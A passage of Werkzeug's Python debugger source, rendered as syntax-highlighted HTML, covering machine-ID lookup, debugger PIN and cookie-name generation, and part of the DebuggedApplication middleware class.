                <span class="token punctuation">[</span><span class="token string">"ioreg"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"IOPlatformExpertDevice"</span><span class="token punctuation">,</span> <span class="token string">"-d"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE
            <span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

        <span class="token comment"># On Windows, use winreg to get the machine guid.</span>
        <span class="token keyword">if</span> sys<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">"win32"</span><span class="token punctuation">:</span>
            <span class="token keyword">import</span> winreg

            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> winreg<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>
                    winreg<span class="token punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>
                    <span class="token string">"SOFTWARE\\Microsoft\\Cryptography"</span><span class="token punctuation">,</span>
                    <span class="token number">0</span><span class="token punctuation">,</span>
                    winreg<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> winreg<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">,</span>
                <span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>
                    guid<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span>
                    guid_type<span class="token punctuation">:</span> <span class="token builtin">int</span>
                    guid<span class="token punctuation">,</span> guid_type <span class="token operator">=</span> winreg<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">"MachineGuid"</span><span class="token punctuation">)</span>

                    <span class="token keyword">if</span> guid_type <span class="token operator">==</span> winreg<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">:</span>
                        <span class="token keyword">return</span> guid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>

                    <span class="token keyword">return</span> guid
            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>

        <span class="token keyword">return</span> <span class="token boolean">None</span>

    _machine_id <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> _machine_id


<span class="token keyword">class</span> <span class="token class-name">_ConsoleFrame</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Helper class so that we can reuse the frame console code for the
    standalone console.
    """</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> namespace<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Any<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>console <span class="token operator">=</span> Console<span class="token punctuation">(</span>namespace<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token number">0</span>

    <span class="token keyword">def</span> <span class="token function">eval</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Any<span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>console<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>
    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """</span>
    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>
    rv <span class="token operator">=</span> <span class="token boolean">None</span>
    num <span class="token operator">=</span> <span class="token boolean">None</span>

    <span class="token comment"># Pin was explicitly disabled</span>
    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>

    <span class="token comment"># Pin was provided explicitly</span>
    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdecimal<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># If there are separators in the pin, return it directly</span>
        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>
            rv <span class="token operator">=</span> pin
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            num <span class="token operator">=</span> pin

    modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>
    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># getuser imports the pwd module, which does not exist in Google</span>
        <span class="token comment"># App Engine. It may also raise a KeyError if the UID does not</span>
        <span class="token comment"># have a username, such as in Docker.</span>
        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> <span class="token boolean">None</span>

    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>

    <span class="token comment"># This information only exists to make the cookie unique on the</span>
    <span class="token comment"># computer, not as a security feature.</span>
    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
        username<span class="token punctuation">,</span>
        modname<span class="token punctuation">,</span>
        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span>

    <span class="token comment"># This information is here to make it harder for an attacker to</span>
    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>
    <span class="token comment"># within the unauthenticated debug page.</span>
    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>

    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

    <span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>
    <span class="token comment"># end up with the same value and generate out 9 digits</span>
    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

    <span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>
    <span class="token comment"># we don't have a result yet.</span>
    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> num

    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name


<span class="token keyword">class</span> <span class="token class-name">DebuggedApplication</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Enables debugging support for a given application::

        from werkzeug.debug import DebuggedApplication
        from myapp import app
        app = DebuggedApplication(app, evalex=True)

    The ``evalex`` argument allows evaluating expressions in any frame
    of a traceback. This works by preserving each frame with its local
    state. Some state, such as :doc:`local`, cannot be restored with the
    frame by default. When ``evalex`` is enabled,
    ``environ["werkzeug.debug.preserve_context"]`` will be a callable
    that takes a context manager, and can be called multiple times.
    Each context manager will be entered before evaluating code in the
    frame, then exited again, so they can perform setup and cleanup for
    each call.

    :param app: the WSGI application to run debugged.
    :param evalex: enable exception evaluation feature (interactive
                   debugging).  This requires a non-forking server.
    :param request_key: The key that points to the request object in this
                        environment.  This parameter is ignored in current
                        versions.
    :param console_path: the URL for a general purpose console.
    :param console_init_func: the function that is executed before starting
                              the general purpose console.  The return value
                              is used as initial namespace.
    :param show_hidden_frames: by default hidden traceback frames are skipped.
                               You can show them by setting this parameter
                               to `True`.
    :param pin_security: can be used to disable the pin based security system.
    :param pin_logging: enables the logging of the pin system.

    .. versionchanged:: 2.2
        Added the ``werkzeug.debug.preserve_context`` environ key.
    """</span>

    _pin<span class="token punctuation">:</span> <span class="token builtin">str</span>
    _pin_cookie<span class="token punctuation">:</span> <span class="token builtin">str</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>
        self<span class="token punctuation">,</span>
        app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span>
        evalex<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
        request_key<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"werkzeug.request"</span><span class="token punctuation">,</span>
        console_path<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"/console"</span><span class="token punctuation">,</span>
        console_init_func<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Callable<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Any<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
        show_hidden_frames<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
        pin_security<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
        pin_logging<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> console_init_func<span class="token punctuation">:</span>
            console_init_func <span class="token operator">=</span> <span class="token boolean">None</span>
        self<span class="token punctuation">.</span>app <span class="token operator">=</span> app
        self<span class="token punctuation">.</span>evalex <span class="token operator">=</span> evalex
        self<span class="token punctuation">.</span>frames<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>DebugFrameSummary<span class="token punctuation">,</span> _ConsoleFrame<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        self<span class="token punctuation">.</span>frame_contexts<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>t<span class="token punctuation">.</span>ContextManager<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        self<span class="token punctuation">.</span>request_key <span class="token operator">=</span> request_key
        self<span class="token punctuation">.</span>console_path <span class="token operator">=</span> console_path
        self<span class="token punctuation">.</span>console_init_func <span class="token operator">=</span> console_init_func
        self<span class="token punctuation">.</span>show_hidden_frames <span class="token operator">=</span> show_hidden_frames
        self<span class="token punctuation">.</span>secret <span class="token operator">=</span> gen_salt<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">=</span> <span class="token number">0</span>

        self<span class="token punctuation">.</span>pin_logging <span class="token operator">=</span> pin_logging
        <span class="token keyword">if</span> pin_security<span class="token punctuation">:</span>
            <span class="token comment"># Print out the pin for the debugger on standard out.</span>
            <span class="token keyword">if</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_RUN_MAIN"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"true"</span> <span class="token keyword">and</span> pin_logging<span class="token punctuation">:</span>
                _log<span class="token punctuation">(</span><span class="token string">"warning"</span><span class="token punctuation">,</span> <span class="token string">" * Debugger is active!"</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>pin <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                    _log<span class="token punctuation">(</span><span class="token string">"warning"</span><span class="token punctuation">,</span> <span class="token string">" * Debugger PIN disabled. DEBUGGER UNSECURED!"</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    _log<span class="token punctuation">(</span><span class="token string">"info"</span><span class="token punctuation">,</span> <span class="token string">" * Debugger PIN: %s"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>pin <span class="token operator">=</span> <span class="token boolean">None</span>

    <span class="token decorator annotation punctuation">@property</span>
    <span class="token keyword">def</span> <span class="token function">pin</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_pin"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            pin_cookie <span class="token operator">=</span> get_pin_and_cookie_name<span class="token punctuation">(</span>self<span class="token punctuation">.</span>app<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>_pin<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_pin_cookie <span class="token operator">=</span> pin_cookie  <span class="token comment"># type: ignore</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_pin

    <span class="token decorator annotation punctuation">@pin<span class="token punctuation">.</span>setter</span>
    <span class="token keyword">def</span> <span class="token function">pin</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>_pin <span class="token operator">=</span> value

    <span class="token decorator annotation punctuation">@property</span>
    <span class="token keyword">def</span> <span class="token function">pin_cookie_name</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""The name of the pin cookie."""</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_pin_cookie"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            pin_cookie <span class="token operator">=</span> get_pin_and_cookie_name<span class="token punctuation">(</span>self<span class="token punctuation">.</span>app<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>_pin<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_pin_cookie <span class="token operator">=</span> pin_cookie  <span class="token comment"># type: ignore</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_pin_cookie

    <span class="token keyword">def</span> <span class="token function">debug_application</span><span class="token punctuation">(</span>
        self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">,</span> start_response<span class="token punctuation">:</span> <span class="token string">"StartResponse"</span>
    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Iterator<span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Run the application and conserve the traceback frames."""</span>
        contexts<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>t<span class="token punctuation">.</span>ContextManager<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Any<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

        <span class="token keyword">if</span> self<span class="token punctuation">.</span>evalex<span class="token punctuation">:</span>
            environ<span class="token punctuation">[</span><span class="token string">"werkzeug.debug.preserve_context"</span><span class="token punctuation">]</span> <span class="token operator">=</span> contexts<span class="token punctuation">.</span>append

        app_iter <span class="token operator">=</span> <span class="token boolean">None</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            app_iter <span class="token operator">=</span> self<span class="token punctuation">.</span>app<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>
            <span class="token keyword">yield</span> <span class="token keyword">from</span> app_iter
            <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>app_iter<span class="token punctuation">,</span> <span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                app_iter<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>app_iter<span class="token punctuation">,</span> <span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                app_iter<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>

            tb <span class="token operator">=</span> DebugTraceback<span class="token punctuation">(</span>e<span class="token punctuation">,</span> skip<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> hide<span class="token operator">=</span><span class="token keyword">not</span> self<span class="token punctuation">.</span>show_hidden_frames<span class="token punctuation">)</span>

            <span class="token keyword">for</span> frame <span class="token keyword">in</span> tb<span class="token punctuation">.</span>all_frames<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> frame
                self<span class="token punctuation">.</span>frame_contexts<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> contexts

            is_trusted <span class="token operator">=</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span>
            html <span class="token operator">=</span> tb<span class="token punctuation">.</span>render_debugger_html<span class="token punctuation">(</span>
                evalex<span class="token operator">=</span>self<span class="token punctuation">.</span>evalex<span class="token punctuation">,</span>
                secret<span class="token operator">=</span>self<span class="token punctuation">.</span>secret<span class="token punctuation">,</span>
                evalex_trusted<span class="token operator">=</span>is_trusted<span class="token punctuation">,</span>
            <span class="token punctuation">)</span>
            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">"text/html"</span><span class="token punctuation">)</span>

            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">yield</span> <span class="token keyword">from</span> response<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                <span class="token comment"># if we end up here there has been output but an error</span>
                <span class="token comment"># occurred.  in that situation we can do nothing fancy any</span>
                <span class="token comment"># more, better log something into the error log and fall</span>
                <span class="token comment"># back gracefully.</span>
                environ<span class="token punctuation">[</span><span class="token string">"wsgi.errors"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>
                    <span class="token string">"Debugging middleware caught exception in streamed "</span>
                    <span class="token string">"response at a point where response headers were already "</span>
                    <span class="token string">"sent.\n"</span>
                <span class="token punctuation">)</span>

            environ<span class="token punctuation">[</span><span class="token string">"wsgi.errors"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>tb<span class="token punctuation">.</span>render_traceback_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">execute_command</span><span class="token punctuation">(</span>  <span class="token comment"># type: ignore[return]</span>
        self<span class="token punctuation">,</span>
        request<span class="token punctuation">:</span> Request<span class="token punctuation">,</span>
        command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
        frame<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>DebugFrameSummary<span class="token punctuation">,</span> _ConsoleFrame<span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Execute a command in a console."""</span>
        contexts <span class="token operator">=</span> self<span class="token punctuation">.</span>frame_contexts<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token keyword">with</span> ExitStack<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> exit_stack<span class="token punctuation">:</span>
            <span class="token keyword">for</span> cm <span class="token keyword">in</span> contexts<span class="token punctuation">:</span>
                exit_stack<span class="token punctuation">.</span>enter_context<span class="token punctuation">(</span>cm<span class="token punctuation">)</span>

            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>frame<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">"text/html"</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">display_console</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">:</span> Request<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Display a standalone shell."""</span>
        <span class="token keyword">if</span> <span class="token number">0</span> <span class="token keyword">not</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>frames<span class="token punctuation">:</span>
            <span class="token keyword">if</span> self<span class="token punctuation">.</span>console_init_func <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                ns <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
